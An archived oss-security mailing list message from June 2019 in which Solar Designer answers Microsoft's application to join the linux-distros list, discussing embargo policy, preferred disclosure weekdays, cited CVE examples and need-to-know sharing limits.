| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux  *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper  *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists  *for password cracking*](/wordlists/)+ [passwdqc  *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt  *KDF & password hashing*](/yescrypt/)+ [yespower  *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish  *password hashing*](/crypt/)+ [phpass  *ditto in PHP*](/phpass/)+ [tcb  *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd  *port scan detector*](/scanlogd/)+ [popa3d  *tiny POP3 daemon*](/popa3d/)+ [blists  *web interface to mailing lists*](/blists/)+ [msulogin  *single user mode login*](/msulogin/)+ [php\_mt\_seed  *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](../../../2019/06/27/9) [[next>]](2) [[<thread-prev]](../../../2019/06/27/9) [[thread-next>]](2) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20190628125743.GA2187@openwall.com>
Date: Fri, 28 Jun 2019 14:57:43 +0200
From: Solar Designer <solar@...nwall.com>
To: oss-security@...ts.openwall.com
Subject: Re: linux-distros membership application - Microsoft

On Thu, Jun 27, 2019 at 01:05:08PM -0400, Sasha Levin wrote:
> security@k.o is not a disclosure list, but
> rather just a way to pull in kernel folks to fix issues. Some (most?) of
> the kernel bugs that get fixed don't go through that list to begin with.

"Some (most?) of the kernel [security] bugs that get fixed don't go
through" linux-distros as well.

> The kernel's documentation with regards to security issues and
> disclosure actually points to linux-distros:
> <https://www.kernel.org/doc/Documentation/admin-guide/security-bugs.rst> .

I'm not entirely happy with the wording used there, which currently is:

---
Fixes for sensitive bugs, such as those that might lead to privilege
escalations, may need to be coordinated with the private
<linux-distros@...openwall.org> mailing list so that distribution vendors
are well prepared to issue a fixed kernel upon public disclosure of the
upstream fix. Distros will need some time to test the proposed patch and
will generally request at least a few days of embargo, and vendor update
publication prefers to happen Tuesday through Thursday. When appropriate,
the security team can assist with this coordination, or the reporter can
include linux-distros from the start. In this case, remember to prefix
the email Subject line with "[vs]" as described in the linux-distros wiki:
<<http://oss-security.openwall.org/wiki/mailing-lists/distros#how-to-use-the-lists>>
---

This says that "Distros [...] will generally request at least a few days
of embargo", but the actual policy of (linux-)distros is that the
reporter must provide a tentative public disclosure date/time in their
very first message.

Also, this doesn't say that by disclosing something to (linux-)distros
the reporter accepts the list's policy, and leaves actually reading that
wiki page with the policy optional.

I don't readily have suggested edits, but we should address these issues
somehow.  Please feel free to suggest edits.

On a related note, this might not be representative, but I ran a Twitter
poll on days of week for vulnerability disclosures:

<https://twitter.com/solardiz/status/923885360001757185>

Poll: What days of week work best for you for public disclosure by
others of vulnerabilities in software you (or your employer, etc.) use?

23% No preference or Other
33% Mon
36% Tue, Wed, Thu
 8% Fri, Sat, Sun

164 votes

12:13 PM - 27 Oct 2017

As you can see, Mon fared really well - almost same as Tue, Wed, Thu
combined, meaning that it might be _the_ preferred day of week for
vulnerability disclosures.  So we probably shouldn't exclude Mondays.

> To complicate your question further: the Linux usage on our cloud has
> surpassed Windows, as a by-product of that MSRC has started receiving
> security reports of issues with Linux code both from users and vendors.
> It's also the case that issues that are common for Windows and Linux
> (like those speculative hardware bugs) are shared with us via MSRC as
> well.
>
> If you think that there's value in connecting between these 3
> entities, I'd be happy to do so (maybe as part of a new task).

I'm not sure.  The microarchitectural "bugs" would have been
inappropriate to bring to the distros list earlier than in 14 days prior
to their public disclosures, and I don't know if the public disclosure
dates on those were specific enough to achieve that.  Maybe you know?

> >It'd be helpful if you could directly address this part: "including some
> >that had been handled on (linux-)distros, meaning that membership would
> >have been relevant to you".  Without such examples yet, we'd have to be
> >guessing whether the membership would have been relevant to you or not.
> >
> >Right now, the statistics at:
> >
> ><https://oss-security.openwall.org/wiki/mailing-lists/distros/stats>
> >
> >only go until the end of 2018, so you'd be able to use them for examples
> >dating back to 2018 and earlier.  We should ask Gentoo to update these
> >statistics soon, perhaps for period until end of June 2019, which will
> >be possible soon.
>
> Sure! Issues on the stats page that would not have been reported to MSRC
> but are relevant to us would include:
>
> - On the kernel side, issues such as CVE-2017-7533
>  (<https://www.openwall.com/lists/oss-security/2017/08/03/2>) would be
>  relevant for all our offerings.
>
> - Core libraries affect us as well, for example CVE-2017-1000408
>   (<https://www.openwall.com/lists/oss-security/2017/12/11/4>). This
>   would affect our Sphere and SaaS offerings, as well as probably make
>   us run through them through test gauntlet for WSLv2.
>
> - Higher level Linux tools, such as the one in CVE-2018-14722
>   (<https://www.openwall.com/lists/oss-security/2018/08/14/7>) affect
>   mostly our IaaS offerings, but I expect that we'd again validate the
>   rest of our offerings with the fix.

Thanks!  Ideally, you'd also demonstrate that Microsoft fixed those
issues (where relevant) within days of their public disclosure (so that
some days of advance notice would have made a difference).  Can you?

Or are you merely pointing out the kind of issues that would have been
relevant to you and presumably fixed promptly now, but were not relevant
and thus were not fixed back then?  That's less than ideal if so.

> Sure, we'd love to help with the list's pain points.

Great!

> >The lack of a volunteer distro for Administrative "4. Evaluate relevance
> >to other parties ..." came up e.g. here:
> >
> >"Linux kernel: Bluetooth: two remote infoleaks (CVE-2019-3459,
> >CVE-2019-3460)"
> ><https://www.openwall.com/lists/oss-security/2019/01/11/2>
>
> This could be interesting for us. we already work closely with multiple
> distros as part of our public IaaS offering, as well as my work
> maintaining the stable tree means I interact often with many subsystem
> maintainers. We could leverage that for this task.
>
> I think that this task would also benefit from collaboration with MSRC,
> where for example we could verify whether the Bluetooth issue you brought
> up would affect Windows, and whether issues reported to MSRC also affect
> Linux.

If Microsoft joins for its Linux offerings (including Linux on top of
Windows), then checking if the Linux issues also affect Windows (itself)
would involve sharing beyond the need-to-know condition of
(linux-)distros list policy, so isn't allowed by default.  It could
still be done with explicit approval of the reporter, though, and I
expect most people would give such approval if asked.

Alexander

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).


